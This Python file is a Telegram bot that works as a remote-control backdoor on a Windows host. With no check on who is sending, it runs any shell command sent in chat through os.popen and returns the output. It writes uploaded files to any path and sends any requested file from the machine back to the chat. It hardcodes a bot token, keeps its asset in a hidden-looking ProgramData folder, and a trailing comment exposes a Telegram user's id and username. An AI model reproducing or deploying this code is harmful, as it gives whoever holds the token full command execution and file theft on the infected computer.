import telebot
import os
import threading
import requests
from telebot import util
import time

TOKEN = "1110461649:AAF0trX6xQyvT7uERFa5sTYvBV6LFo3lxnk"

# bot = telepot.Bot(TOKEN)
# upd = bot.getUpdates()


# print(upd)
# identifier = upd[0]["message"]["chat"]["id"]
# text = upd[0]["message"]["text"]
# msg = text.split(" ")

# def handle(msg):
#     print(msg)
#     pass

# MessageLoop(bot, handle).run_as_thread()

bot = telebot.TeleBot(TOKEN)
# upd = bot.get_updates(-10)
# upd = upd[0]
# print(upd)

keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
item1 = telebot.types.KeyboardButton("zik hi")
keyboard.add(item1)

filename = ""

@bot.message_handler(commands=["start"])
def proc1(message: telebot.types.Message):
    zik = open("C:\\ProgramData\\pycache\\welcome.webp", "rb")
    bot.send_sticker(message.chat.id, zik, reply_markup=keyboard)


# print(bot.get_updates()[0])


@bot.message_handler(content_types=["document"])
def proc_file(message: telebot.types.Message):
    # print(message.__dict__)
    global filename
    if (filename != ""):
        file = requests.get('https://api.telegram.org/file/bot{0}/{1}'.format(TOKEN, bot.get_file(message.document.__dict__["file_id"]).file_path))
        trans_file = open(filename, "w")
        trans_file.write(file.text)
        trans_file.close()
        filename = ""



@bot.message_handler(content_types=["text"])
def proc_message(message: telebot.types.Message):
    print(message.__dict__)
    cmd: list = message.text.split(" ")
    ident = message.message_id + 1
    if (cmd[0] == "clear" and cmd.__len__() >= 3):
        threads = []
        for i in range(int(cmd[1]), min(int(cmd[2]), ident)):
            t = threading.Thread(target=delete_all_msg, args=(message.chat.id, i))
            threads.append(t)
            t.start()
        for i in threads:
            i.join()
        if (cmd.__len__() >= 4):
            if (cmd[3] == "silent"):
                bot.send_message(message.chat.id, "finished : last = " + str(ident))
                time.sleep(2)
                bot.delete_message(message.chat.id, message.message_id + 1)
            else:
                bot.send_message(message.chat.id, "finished : last = " + str(ident))
        else:
            bot.send_message(message.chat.id, "finished : last = " + str(ident))

    elif (cmd[0] == "cmd" and cmd.__len__() > 1):
        index = -1
        itr = 0
        leng = 0
        for i in cmd:
            if i == "/in":
                index = itr
                break
            leng += i.__len__() + 1
            print(leng)
            itr += 1
        if index > 0:
            file = open("in.txt", "w");
            inp = ""
            for i in range(index + 1, cmd.__len__()):
                inp += cmd[i]
            file.write(inp + "\n")
            print(inp)
            file.close()
            command: str = message.text[4:leng:] + " < in.txt 2>&1"
            print(command)
            p = os.popen(command, "r", 100)
        else:
            p = os.popen(message.text[4::] + " 2>&1", "r", 100)
        res = [*p]
        print(res)
        str_res = ""
        for i in res:
            i.replace("\n", "<br>")
            str_res += i
        print(str_res)
        str_res = util.split_string(str_res, 3000)
        for i in str_res:
            bot.send_message(message.chat.id, i)
    elif (cmd[0] == "msg" and cmd.__len__() >= 2):
        msg = message.text
        msg = msg[4::]
        os.system("msg.exe " + msg)
    elif (cmd[0] == "zik"):
        zik = open("C:\\ProgramData\\pycache\\welcome.webp", "rb")
        bot.send_sticker(message.chat.id, zik)
    elif (cmd[0] == "fl"):
        if (cmd[1] == "s"):
            global filename
            filename = message.text[5::]
        elif (cmd[1] == "g"):
            filename = message.text[5::]
            err = False
            try:
                file = open(filename, "rb")
            except (...):
                bot.send_message(message.chat.id, "can't open file", reply_markup=keyboard, reply_to_message_id=message.message_id)
                err = True
            if (not err):
                bot.send_document(message.chat.id, file, reply_to_message_id=message.message_id)
                print(file)
                file.close()

    else:
        bot.send_message(message.chat.id, "commands :\n\tcmd [...] /in [...]\n\tclear [from] [to]\n\tmsg [...]\n\tfl s (send)\n\t   g (get)", reply_markup=keyboard)


# , parse_mode="html"

def delete_all_msg(chat_id, msg_id=0):
    bot.delete_message(chat_id, msg_id)
    pass


bot.polling(none_stop=True)

# {'update_id': 243754636, 'message': {'content_type': 'document', 'message_id': 1126, 'from_user': < telebot.types.User
#  object at 0x7f7d1b748cd0 >, 'date': 1582727846, 'chat': < telebot.types.Chat
# object
# at
# 0x7f7d1b748b80 >, 'forward_from_chat': None, 'forward_from_message_id': None, 'forward_from': None, 'forward_date': None, 'reply_to_message': None, 'edit_date': None, 'media_group_id': None, 'author_signature': None, 'text': None, 'entities': None, 'caption_entities': None, 'audio': None, 'document': < telebot.types.Document
# object
# at
# 0x7f7d1b748b20 >, 'photo': None, 'sticker': None, 'video': None, 'video_note': None, 'voice': None, 'caption': None, 'contact': None, 'location': None, 'venue': None, 'animation': None, 'new_chat_member': None, 'new_chat_members': None, 'left_chat_member': None, 'new_chat_title': None, 'new_chat_photo': None, 'delete_chat_photo': None, 'group_chat_created': None, 'supergroup_chat_created': None, 'channel_chat_created': None, 'migrate_to_chat_id': None, 'migrate_from_chat_id': None, 'pinned_message': None, 'invoice': None, 'successful_payment': None, 'connected_website': None, 'json': {
#     'message_id': 1126,
#     'from': {'id': 739135222, 'is_bot': False, 'first_name': 'dima', 'username': 'dima_p_1', 'language_code': 'en'},
#     'chat' : {...},
#     'document': {'file_name': 'lib.py', 'mime_type': 'text/x-python',
#                  'file_id': 'BQACAgIAAxkBAAIEZl5WgqZ3QPJpdnuI3kDwj32gDT32AAIzBQACD0WwSkKUcWrwCKvAGAQ',
#                  'file_unique_id': 'AgADMwUAAg9FsEo',
#                  'file_size': 3564}}}, 'edited_message': None, 'channel_post': None, 'edited_channel_post': None, 'inline_query': None, 'chosen_inline_result': None, 'callback_query': None, 'shipping_query': None, 'pre_checkout_query': None}
